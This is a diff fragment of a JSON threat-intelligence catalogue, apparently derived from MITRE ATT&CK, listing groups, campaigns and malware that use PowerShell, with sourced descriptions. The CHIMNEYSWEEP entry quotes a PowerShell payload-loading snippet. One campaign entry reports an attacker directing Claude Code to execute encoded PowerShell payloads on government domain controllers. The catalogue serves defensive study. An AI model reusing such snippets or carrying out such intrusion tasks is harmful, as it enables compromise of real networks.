+      },
+      {
+        "name": "Patchwork",
+        "attack_id": "G0040",
+        "evidence": "uses T1059.001",
+        "description": "Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.",
+        "sources": "Cymmetria Patchwork https://web.archive.org/web/20180825085952/https:/s3-us-west-2.amazonaws.com/cymmetria-blog/public/Unveiling_Patchwork.pdf; TrendMicro Patchwork Dec 2017 https://documents.trendmicro.com/assets/tech-brief-untangling-the-patchwork-cyberespionage-group.pdf"
+      },
+      {
+        "name": "Play",
+        "attack_id": "G1040",
+        "evidence": "uses T1059.001",
+        "description": "Play has used Base64-encoded PowerShell scripts to disable Microsoft Defender.",
+        "sources": "Trend Micro Ransomware Spotlight Play July 2023 https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play"
+      },
+      {
+        "name": "Poseidon Group",
+        "attack_id": "G0033",
+        "evidence": "uses T1059.001",
+        "description": "The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.",
+        "sources": "Kaspersky Poseidon Group https://securelist.com/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/73673/"
+      },
+      {
+        "name": "RedCurl",
+        "attack_id": "G1039",
+        "evidence": "uses T1059.001",
+        "description": "RedCurl has used PowerShell to execute commands and to download malware.",
+        "sources": "group-ib_redcurl1 https://www.group-ib.com/resources/research-hub/red-curl/; group-ib_redcurl2 https://www.group-ib.com/resources/research-hub/red-curl-2/; trendmicro_redcurl https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html"
+      },
+      {
+        "name": "Saint Bear",
+        "attack_id": "G1031",
+        "evidence": "uses T1059.001",
+        "description": "Saint Bear relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads.",
+        "sources": "Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      },
+      {
+        "name": "Sandworm Team",
+        "attack_id": "G0034",
+        "evidence": "uses T1059.001",
+        "description": "Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.",
+        "sources": "Dragos Crashoverride 2018 https://www.dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf; US District Court Indictment GRU Unit 74455 October 2020 https://www.justice.gov/opa/press-release/file/1328521/download"
+      },
+      {
+        "name": "Scattered Spider",
+        "attack_id": "G1015",
+        "evidence": "uses T1059.001",
+        "description": "Scattered Spider has used the PowerShell cmdlet Get-ADUser.",
+        "sources": "CrowdStrike Scattered Spider JUL 2025 https://www.crowdstrike.com/en-us/blog/crowdstrike-services-observes-scattered-spider-escalate-attacks/"
+      },
+      {
+        "name": "Sidewinder",
+        "attack_id": "G0121",
+        "evidence": "uses T1059.001",
+        "description": "Sidewinder has used PowerShell to drop and execute malware loaders.",
+        "sources": "ATT Sidewinder January 2021 https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf"
+      },
+      {
+        "name": "Silence",
+        "attack_id": "G0091",
+        "evidence": "uses T1059.001",
+        "description": "Silence has used PowerShell to download and execute payloads.",
+        "sources": "Group IB Silence Sept 2018 https://go.group-ib.com/report-silence-en?_gl=1*d1bh3a*_ga*MTIwMzM5Mzc5MS4xNjk4OTI5NzY4*_ga_QMES53K3Y2*MTcwNDcyMjU2OS40LjEuMTcwNDcyMzU1Mi41My4wLjA.; Cyber Forensicator Silence Jan 2019 https://web.archive.org/web/20220119133748/https://cyberforensicator.com/2019/01/20/silence-dissecting-malicious-chm-files-and-performing-forensic-analysis/"
+      },
+      {
+        "name": "Stealth Falcon",
+        "attack_id": "G0038",
+        "evidence": "uses T1059.001",
+        "description": "Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.",
+        "sources": "Citizen Lab Stealth Falcon May 2016 https://citizenlab.org/2016/05/stealth-falcon/"
+      },
+      {
+        "name": "Storm-0501",
+        "attack_id": "G1053",
+        "evidence": "uses T1059.001",
+        "description": "Storm-0501 has leveraged PowerShell to execute commands and scripts.",
+        "sources": "Microsoft Storm-501 Sabbath Ransomware Embargo September 2024 https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/; Microsoft Storm-0501 Embargo Ransomware August 2025 https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/"
+      },
+      {
+        "name": "Storm-1811",
+        "attack_id": "G1046",
+        "evidence": "uses T1059.001",
+        "description": "Storm-1811 has used PowerShell for multiple purposes, such as using PowerShell scripts executing in an infinite loop to create an SSH connection to a command and control server.",
+        "sources": "rapid7-email-bombing https://www.rapid7.com/blog/post/2024/05/10/ongoing-social-engineering-campaign-linked-to-black-basta-ransomware-operators"
+      },
+      {
+        "name": "TA2541",
+        "attack_id": "G1018",
+        "evidence": "uses T1059.001",
+        "description": "TA2541 has used PowerShell to download files and to inject into various Windows processes.",
+        "sources": "Proofpoint TA2541 February 2022 https://www.proofpoint.com/us/blog/threat-insight/charting-ta2541s-flight"
+      },
+      {
+        "name": "TA459",
+        "attack_id": "G0062",
+        "evidence": "uses T1059.001",
+        "description": "TA459 has used PowerShell for execution of a payload.",
+        "sources": "Proofpoint TA459 April 2017 https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts"
+      },
+      {
+        "name": "TA505",
+        "attack_id": "G0092",
+        "evidence": "uses T1059.001",
+        "description": "TA505 has used PowerShell to download and execute malware and reconnaissance scripts.",
+        "sources": "Proofpoint TA505 Sep 2017 https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter; ProofPoint SettingContent-ms July 2018 https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat; Cybereason TA505 April 2019 https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware; Deep Instinct TA505 Apr 2019 https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+      },
+      {
+        "name": "TeamTNT",
+        "attack_id": "G0139",
+        "evidence": "uses T1059.001",
+        "description": "TeamTNT has executed PowerShell commands in batch scripts.",
+        "sources": "ATT TeamTNT Chimaera September 2020 https://cybersecurity.att.com/blogs/labs-research/teamtnt-with-new-campaign-aka-chimaera"
+      },
+      {
+        "name": "Threat Group-3390",
+        "attack_id": "G0027",
+        "evidence": "uses T1059.001",
+        "description": "Threat Group-3390 has used PowerShell for execution.",
+        "sources": "SecureWorks BRONZE UNION June 2017 https://www.secureworks.com/research/bronze-union; Trend Micro DRBControl February 2020 https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "name": "Thrip",
+        "attack_id": "G0076",
+        "evidence": "uses T1059.001",
+        "description": "Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.",
+        "sources": "Symantec Thrip June 2018 https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets"
+      },
+      {
+        "name": "ToddyCat",
+        "attack_id": "G1022",
+        "evidence": "uses T1059.001",
+        "description": "ToddyCat has used Powershell scripts to perform post exploit collection.",
+        "sources": "Kaspersky ToddyCat Check Logs October 2023 https://securelist.com/toddycat-keep-calm-and-check-logs/110696/"
+      },
+      {
+        "name": "Tonto Team",
+        "attack_id": "G0131",
+        "evidence": "uses T1059.001",
+        "description": "Tonto Team has used PowerShell to download additional payloads.",
+        "sources": "ESET Exchange Mar 2021 https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
+      },
+      {
+        "name": "Turla",
+        "attack_id": "G0010",
+        "evidence": "uses T1059.001",
+        "description": "Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory.",
+        "sources": "ESET Turla Mosquito May 2018 https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/; ESET Turla PowerShell May 2019 https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/; Symantec Waterbug Jun 2019 https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments"
+      },
+      {
+        "name": "UNC3886",
+        "attack_id": "G1048",
+        "evidence": "uses T1059.001",
+        "description": "UNC3886 has used a PowerShell script to search memory dumps for credentials.",
+        "sources": "Google Cloud Threat Intelligence ESXi VIBs 2022 https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence"
+      },
+      {
+        "name": "VOID MANTICORE",
+        "attack_id": "G1055",
+        "evidence": "uses T1059.001",
+        "description": "VOID MANTICORE has utilized PowerShell to execute malware in victim environments.",
+        "sources": "DOJ FBI Handala Hack March 2026 https://www.justice.gov/opa/media/1431956/dl?inline; FBI IC3 Flash VOID MANTICORE Handala Hack March 2026 https://www.ic3.gov/CSA/2026/260320.pdf"
+      },
+      {
+        "name": "Volt Typhoon",
+        "attack_id": "G1017",
+        "evidence": "uses T1059.001",
+        "description": "Volt Typhoon has used PowerShell including for remote system discovery.",
+        "sources": "CISA AA24-038A PRC Critical Infrastructure February 2024 https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf; Microsoft Volt Typhoon May 2023 https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/; Joint Cybersecurity Advisory Volt Typhoon June 2023 https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF"
+      },
+      {
+        "name": "Winter Vivern",
+        "attack_id": "G1035",
+        "evidence": "uses T1059.001",
+        "description": "Winter Vivern passed execution from document macros to PowerShell scripts during initial access operations. Winter Vivern used batch scripts that called PowerShell commands as part of initial access and installation operations.",
+        "sources": "CERT-UA WinterVivern 2023 https://cert.gov.ua/article/3761104; DomainTools WinterVivern 2021 https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs/"
+      },
+      {
+        "name": "WIRTE",
+        "attack_id": "G0090",
+        "evidence": "uses T1059.001",
+        "description": "WIRTE has used PowerShell for script execution.",
+        "sources": "Lab52 WIRTE Apr 2019 https://lab52.io/blog/wirte-group-attacking-the-middle-east/"
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": "uses T1059.001",
+        "description": "Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.",
+        "sources": "Red Canary Hospital Thwarted Ryuk October 2020 https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/; DHS/CISA Ransomware Targeting Healthcare October 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-302a; CrowdStrike Grim Spider May 2019 https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/; FireEye KEGTAP SINGLEMALT October 2020 https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html; Mandiant FIN12 Oct 2021 https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "2016 Ukraine Electric Power Attack",
+        "attack_id": "C0025",
+        "evidence": "uses T1059.001",
+        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.",
+        "sources": "Dragos Crashoverride 2018 https://www.dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf"
+      },
+      {
+        "name": "2022 Ukraine Electric Power Attack",
+        "attack_id": "C0034",
+        "evidence": "uses T1059.001",
+        "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.",
+        "sources": "Mandiant-Sandworm-Ukraine-2022 https://www.mandiant.com/resources/blog/sandworm-disrupts-power-ukraine-operational-technology"
+      },
+      {
+        "name": "AI-Assisted Breach of Mexico's Government Infrastructure",
+        "attack_id": "C0064",
+        "evidence": "uses T1059.001",
+        "description": "During the AI-Assisted Breach of Mexico's Government Infrastructure, the adversary tasked Claude Code to use `ntlmrelay.py` to execute a base64-encoded PowerShell payload on five domain controllers. During the AI-Assisted Breach of Mexico's Government Infrastructure, the adversary utilized base64-encoded PowerShell payloads against victim servers.",
+        "sources": "AI-Mexico-Govt-Breach https://cdn.prod.website-files.com/69944dd945f20ca4a27a7c47/69d8bb5aea59e31efb3b8a7f_Tech_Report_ai_breach_mex_gov.pdf"
+      },
+      {
+        "name": "APT28 Nearest Neighbor Campaign",
+        "attack_id": "C0051",
+        "evidence": "uses T1059.001",
+        "description": "During APT28 Nearest Neighbor Campaign, APT28 used PowerShell cmdlet Get-ChildItem to access credentials, among other PowerShell functions deployed.",
+        "sources": "Nearest Neighbor Volexity https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "name": "C0018",
+        "attack_id": "C0018",
+        "evidence": "uses T1059.001",
+        "description": "During C0018, the threat actors used encoded PowerShell scripts for execution.",
+        "sources": "Costa AvosLocker May 2022 https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory; Cisco Talos Avos Jun 2022 https://blog.talosintelligence.com/avoslocker-new-arsenal/"
+      },
+      {
+        "name": "C0021",
+        "attack_id": "C0021",
+        "evidence": "uses T1059.001",
+        "description": "During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an.LNK file.",
+        "sources": "FireEye APT29 Nov 2018 https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html; Microsoft Unidentified Dec 2018 https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/"
+      },
+      {
+        "name": "C0032",
+        "attack_id": "C0032",
+        "evidence": "uses T1059.001",
+        "description": "During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping.",
+        "sources": "FireEye TRITON 2019 https://www.fireeye.com/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html"
+      },
+      {
+        "name": "Frankenstein",
+        "attack_id": "C0001",
+        "evidence": "uses T1059.001",
+        "description": "During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.",
+        "sources": "Talos Frankenstein June 2019 https://blog.talosintelligence.com/2019/06/frankenstein-campaign.html"
+      },
+      {
+        "name": "HomeLand Justice",
+        "attack_id": "C0038",
+        "evidence": "uses T1059.001",
+        "description": "During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery.",
+        "sources": "CISA Iran Albanian Attacks September 2022 https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-264a; Microsoft Albanian Government Attacks September 2022 https://www.microsoft.com/en-us/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/"
+      },
+      {
+        "name": "Juicy Mix",
+        "attack_id": "C0044",
+        "evidence": "uses T1059.001",
+        "description": "During Juicy Mix, OilRig used a PowerShell script to steal credentials.",
+        "sources": "ESET OilRig Campaigns Sep 2023 https://www.welivesecurity.com/en/eset-research/oilrigs-outer-space-juicy-mix-same-ol-rig-new-drill-pipes/"
+      },
+      {
+        "name": "Operation AkaiRyū",
+        "attack_id": "C0060",
+        "evidence": "uses T1059.001",
+        "description": "During Operation AkaiRyū, MirrorFace used PowerShell in execution chains to drop additional files such as embedded CAB files.",
+        "sources": "ESET MirrorFace 2025 https://www.welivesecurity.com/en/eset-research/operation-akairyu-mirrorface-invites-europe-expo-2025-revives-anel-backdoor/; Trend Micro Earth Kasha Anel NOV 2024 https://www.trendmicro.com/en_us/research/24/k/return-of-anel-in-the-recent-earth-kasha-spearphishing-campaign.html"
+      },
+      {
+        "name": "Operation Dream Job",
+        "attack_id": "C0022",
+        "evidence": "uses T1059.001",
+        "description": "During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.",
+        "sources": "ESET Lazarus Jun 2020 https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf"
+      },
+      {
+        "name": "Operation Wocao",
+        "attack_id": "C0014",
+        "evidence": "uses T1059.001",
+        "description": "During Operation Wocao, threat actors used PowerShell on compromised systems.",
+        "sources": "FoxIT Wocao December 2019 https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "name": "Pikabot Distribution February 2024",
+        "attack_id": "C0036",
+        "evidence": "uses T1059.001",
+        "description": "Pikabot Distribution February 2024 passed execution from obfuscated JavaScript files to PowerShell scripts to download and install Pikabot.",
+        "sources": "Elastic Pikabot 2024 https://www.elastic.co/security-labs/pikabot-i-choose-you"
+      },
+      {
+        "name": "RedDelta Modified PlugX Infection Chain Operations",
+        "attack_id": "C0047",
+        "evidence": "uses T1059.001",
+        "description": "Mustang Panda used LNK files to execute PowerShell commands leading to eventual PlugX installation during RedDelta Modified PlugX Infection Chain Operations.",
+        "sources": "Recorded Future RedDelta 2025 https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf"
+      },
+      {
+        "name": "SharePoint ToolShell Exploitation",
+        "attack_id": "C0058",
+        "evidence": "uses T1059.001",
+        "description": "During SharePoint ToolShell Exploitation, threat actors used PowerShell to execute attacker-controlled encoded commands.",
+        "sources": "Eye Research ToolShell JUL 2025 https://research.eye.security/sharepoint-under-siege/; SentinelOne ToolShell JUL 2025 https://www.sentinelone.com/blog/sharepoint-toolshell-zero-day-exploited-in-the-wild-targets-enterprise-servers/; Microsoft SharePoint Exploit JUL 2025 https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/#storm-2603; Palo Alto SharePoint Vulnerabilities JUL 2025 https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/"
+      },
+      {
+        "name": "SolarWinds Compromise",
+        "attack_id": "C0024",
+        "evidence": "uses T1059.001",
+        "description": "During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.",
+        "sources": "Volexity SolarWinds https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/; CrowdStrike StellarParticle January 2022 https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/; Microsoft Analyzing Solorigate Dec 2020 https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/"
+      },
+      {
+        "name": "Triton Safety Instrumented System Attack",
+        "attack_id": "C0030",
+        "evidence": "uses T1059.001",
+        "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.",
+        "sources": "FireEye TEMP.Veles 2018 https://web.archive.org/web/20190202205824/https://www.fireeye.com/blog/threat-research/2018/10/triton-attribution-russian-government-owned-lab-most-likely-built-tools.html"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "Akira",
+        "attack_id": "S1129",
+        "evidence": "uses T1059.001",
+        "description": "Akira will execute PowerShell commands to delete system volume shadow copies.",
+        "sources": "CISA Akira Ransomware APR 2024 https://www.cisa.gov/sites/default/files/2024-04/aa24-109a-stopransomware-akira-ransomware_2.pdf; Kersten Akira 2023 https://www.trellix.com/blogs/research/akira-ransomware/"
+      },
+      {
+        "name": "AppleSeed",
+        "attack_id": "S0622",
+        "evidence": "uses T1059.001",
+        "description": "AppleSeed has the ability to execute its payload via PowerShell.",
+        "sources": "Malwarebytes Kimsuky June 2021 https://blog.malwarebytes.com/threat-analysis/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/"
+      },
+      {
+        "name": "AutoIt backdoor",
+        "attack_id": "S0129",
+        "evidence": "uses T1059.001",
+        "description": "AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.",
+        "sources": "Forcepoint Monsoon https://www.forcepoint.com/sites/default/files/resources/files/forcepoint-security-labs-monsoon-analysis-report.pdf"
+      },
+      {
+        "name": "BADHATCH",
+        "attack_id": "S1081",
+        "evidence": "uses T1059.001",
+        "description": "BADHATCH can utilize `powershell.exe` to execute commands on a compromised host.",
+        "sources": "Gigamon BADHATCH Jul 2019 https://blog.gigamon.com/2019/07/23/abadbabe-8badf00d-discovering-badhatch-and-a-detailed-look-at-fin8s-tooling/; BitDefender BADHATCH Mar 2021 https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
+      },
+      {
+        "name": "Bandook",
+        "attack_id": "S0234",
+        "evidence": "uses T1059.001",
+        "description": "Bandook has used PowerShell loaders as part of execution.",
+        "sources": "CheckPoint Bandook Nov 2020 https://research.checkpoint.com/2020/bandook-signed-delivered/"
+      },
+      {
+        "name": "Bazar",
+        "attack_id": "S0534",
+        "evidence": "uses T1059.001",
+        "description": "Bazar can execute a PowerShell script received from C2.",
+        "sources": "NCC Group Team9 June 2020 https://research.nccgroup.com/2020/06/02/in-depth-analysis-of-the-new-team9-malware-family/; CrowdStrike Wizard Spider October 2020 https://www.crowdstrike.com/blog/wizard-spider-adversary-update/"
+      },
+      {
+        "name": "Black Basta",
+        "attack_id": "S1070",
+        "evidence": "uses T1059.001",
+        "description": "Black Basta has used PowerShell scripts for discovery and to execute files over the network.",
+        "sources": "Trend Micro Black Basta May 2022 https://www.trendmicro.com/en_us/research/22/e/examining-the-black-basta-ransomwares-infection-routine.html; NCC Group Black Basta June 2022 https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/; Trend Micro Black Basta Spotlight September 2022 https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta"
+      },
+      {
+        "name": "BONDUPDATER",
+        "attack_id": "S0360",
+        "evidence": "uses T1059.001",
+        "description": "BONDUPDATER is written in PowerShell.",
+        "sources": "FireEye APT34 Dec 2017 https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html; Palo Alto OilRig Sep 2018 https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "name": "Bumblebee",
+        "attack_id": "S1039",
+        "evidence": "uses T1059.001",
+        "description": "Bumblebee can use PowerShell for execution.",
+        "sources": "Medium Ali Salem Bumblebee April 2022 https://elis531989.medium.com/the-chronicles-of-bumblebee-the-hook-the-bee-and-the-trickbot-connection-686379311056"
+      },
+      {
+        "name": "CharmPower",
+        "attack_id": "S0674",
+        "evidence": "uses T1059.001",
+        "description": "CharmPower can use PowerShell for payload execution and C2 communication.",
+        "sources": "Check Point APT35 CharmPower January 2022 https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/"
+      },
+      {
+        "name": "CHIMNEYSWEEP",
+        "attack_id": "S1149",
+        "evidence": "uses T1059.001",
+        "description": "CHIMNEYSWEEP can invoke the PowerShell command `[Reflection.Assembly]::LoadFile(\\\"%s\\\")\\n$i=\\\"\\\"\\n$r=[%s]::%s(\\\"%s\\\",[ref] $i)\\necho $r,$i\\n` to execute secondary payloads.",
+        "sources": "Mandiant ROADSWEEP August 2022 https://cloud.google.com/blog/topics/threat-intelligence/likely-iranian-threat-actor-conducts-politically-motivated-disruptive-activity-against/"
+      },
+      {
+        "name": "Clambling",
+        "attack_id": "S0660",
+        "evidence": "uses T1059.001",
+        "description": "The Clambling dropper can use PowerShell to download the malware.",
+        "sources": "Trend Micro DRBControl February 2020 https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "name": "Cobalt Strike",
+        "attack_id": "S0154",
+        "evidence": "uses T1059.001",
+        "description": "Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution.",
+        "sources": "Cobalt Strike TTPs Dec 2017 https://web.archive.org/web/20210924171429/https://www.cobaltstrike.com/downloads/reports/tacticstechniquesandprocedures.pdf; Cyberreason Anchor December 2019 https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware; Talos Cobalt Strike September 2020 https://web.archive.org/web/20210219195905/https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf; CobaltStrike Daddy May 2017 https://web.archive.org/web/20171009220105/https://blog.cobaltstrike.com/2017/05/23/cobalt-strike-3-8-whos-your-daddy/; cobaltstrike manual https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf; Cobalt Strike Manual 4.3 November 2020 https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf"
+      },
+      {
+        "name": "ComRAT",
+        "attack_id": "S0126",
+        "evidence": "uses T1059.001",
+        "description": "ComRAT has used PowerShell to load itself every time a user logs in to the system. ComRAT can execute PowerShell scripts loaded into memory or from the file system.",
+        "sources": "ESET ComRAT May 2020 https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf; CISA ComRAT Oct 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-303a"
+      },
+      {
+        "name": "CreepyDrive",
+        "attack_id": "S1023",
+        "evidence": "uses T1059.001",
+        "description": "CreepyDrive can use Powershell for execution, including the cmdlets `Invoke-WebRequest` and `Invoke-Expression`.",
+        "sources": "Microsoft POLONIUM June 2022 https://www.microsoft.com/security/blog/2022/06/02/exposing-polonium-activity-and-infrastructure-targeting-israeli-organizations/"
+      },
+      {
+        "name": "CreepySnail",
+        "attack_id": "S1024",
+        "evidence": "uses T1059.001",
+        "description": "CreepySnail can use PowerShell for execution, including the cmdlets `Invoke-WebRequst` and `Invoke-Expression`.",
+        "sources": "Microsoft POLONIUM June 2022 https://www.microsoft.com/security/blog/2022/06/02/exposing-polonium-activity-and-infrastructure-targeting-israeli-organizations/"
+      },
+      {
+        "name": "Cuba",
+        "attack_id": "S0625",
+        "evidence": "uses T1059.001",
+        "description": "Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.",
+        "sources": "McAfee Cuba April 2021 https://www.mcafee.com/enterprise/en-us/assets/reports/rp-cuba-ransomware.pdf"
+      },
+      {
+        "name": "DarkGate",
+        "attack_id": "S1111",
+        "evidence": "uses T1059.001",
+        "description": "DarkGate has used PowerShell to create a remote shell.",
+        "sources": "Rapid7 BlackBasta 2024 https://www.rapid7.com/blog/post/2024/12/04/black-basta-ransomware-campaign-drops-zbot-darkgate-and-custom-malware/"
+      },
+      {
+        "name": "DarkWatchman",
+        "attack_id": "S0673",
+        "evidence": "uses T1059.001",
+        "description": "DarkWatchman can execute PowerShell commands and has used PowerShell to execute a keylogger.",
+        "sources": "Prevailion DarkWatchman 2021 https://web.archive.org/web/20220629230035/https://www.prevailion.com/darkwatchman-new-fileless-techniques/"
+      },
+      {
+        "name": "Denis",
+        "attack_id": "S0354",
+        "evidence": "uses T1059.001",
+        "description": "Denis has a version written in PowerShell.",
+        "sources": "Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "DownPaper",
+        "attack_id": "S0186",
+        "evidence": "uses T1059.001",
+        "description": "DownPaper uses PowerShell for execution.",
+        "sources": "ClearSky Charming Kitten Dec 2017 http://www.clearskysec.com/wp-content/uploads/2017/12/Charming_Kitten_2017.pdf"
+      },
+      {
+        "name": "Egregor",
+        "attack_id": "S0554",
+        "evidence": "uses T1059.001",
+        "description": "Egregor has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement.",
+        "sources": "Intrinsec Egregor Nov 2020 https://www.intrinsec.com/egregor-prolock/?cn-reloaded=1"
+      },
+      {
+        "name": "Emotet",
+        "attack_id": "S0367",
+        "evidence": "uses T1059.001",
+        "description": "Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz.",
+        "sources": "Symantec Emotet Jul 2018 https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor; Trend Micro Emotet Jan 2019 https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf; Picus Emotet Dec 2018 https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html; Red Canary Emotet Feb 2019 https://redcanary.com/blog/stopping-emotet-before-it-moves-laterally/; Carbon Black Emotet Apr 2019 https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/"
+      },
+      {
+        "name": "FatDuke",
+        "attack_id": "S0512",
+        "evidence": "uses T1059.001",
+        "description": "FatDuke has the ability to execute PowerShell scripts.",
+        "sources": "ESET Dukes October 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+      },
+      {
+        "name": "Ferocious",
+        "attack_id": "S0679",
+        "evidence": "uses T1059.001",
+        "description": "Ferocious can use PowerShell scripts for execution.",
+        "sources": "Kaspersky WIRTE November 2021 https://securelist.com/wirtes-campaign-in-the-middle-east-living-off-the-land-since-at-least-2019/105044"
+      },
+      {
+        "name": "FlawedAmmyy",
